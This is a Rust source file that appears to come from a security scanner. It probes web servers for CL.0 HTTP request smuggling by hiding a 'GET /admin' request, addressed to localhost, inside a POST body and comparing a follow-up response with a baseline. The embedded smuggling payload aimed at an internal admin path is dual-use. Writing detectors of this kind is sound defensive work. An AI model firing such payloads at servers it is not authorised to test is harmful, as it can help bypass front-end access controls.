use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    _silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    // CL.0: Send POST with Content-Length body, then immediately send a second request.
    // If backend doesn't consume the CL body (CL.0 vulnerability), the second request
    // response will be consumed as body instead.

    let smuggled_req = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";

    let mut request = format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
        host, smuggled_req.len(), env!("CARGO_PKG_VERSION")
    );

    if let Some(a) = auth {
        let mut bytes = request.into_bytes();
        a.apply_to_request(&mut bytes);
        request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
    }

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::time::timeout;
    use std::time::Duration;

    let mut conn = crate::net::connect(cfg).await?;
    conn.write_all(request.as_bytes()).await.map_err(|e| format!("CL.0 write error: {}", e))?;
    conn.write_all(smuggled_req).await.map_err(|e| format!("CL.0 body write error: {}", e))?;

    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf.len() > 1_000_000 { break; }
        if buf.len() > 100 && buf.windows(4).any(|w| w == b"\r\n\r\n") { break; }
    }

    let _first_resp = h1::parse_response(&buf)?;

    let second_req = h1::build_request("GET", "/", host, &[], b"");
    conn.write_all(&second_req).await.ok();

    let mut buf2 = Vec::with_capacity(4096);
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf2.len() > 1_000_000 { break; }
    }

    let second_resp = h1::parse_response(&buf2).unwrap_or_else(|_| baseline.clone());

    // CL.0 detection: second response differs from baseline = backend didn't consume CL body
    let vulnerable = second_resp.body != baseline.body
        || second_resp.status_code != baseline.status_code;

    let host_name = &cfg.host;
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "cl0".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: None,
        status_code: second_resp.status_code,
        details: if vulnerable {
            Some(format!(
                "CL.0: backend did not consume CL body (resp {} vs baseline {})",
                second_resp.status_code, baseline.status_code
            ))
        } else {
            None
        },
        ..Default::default()
    })
}
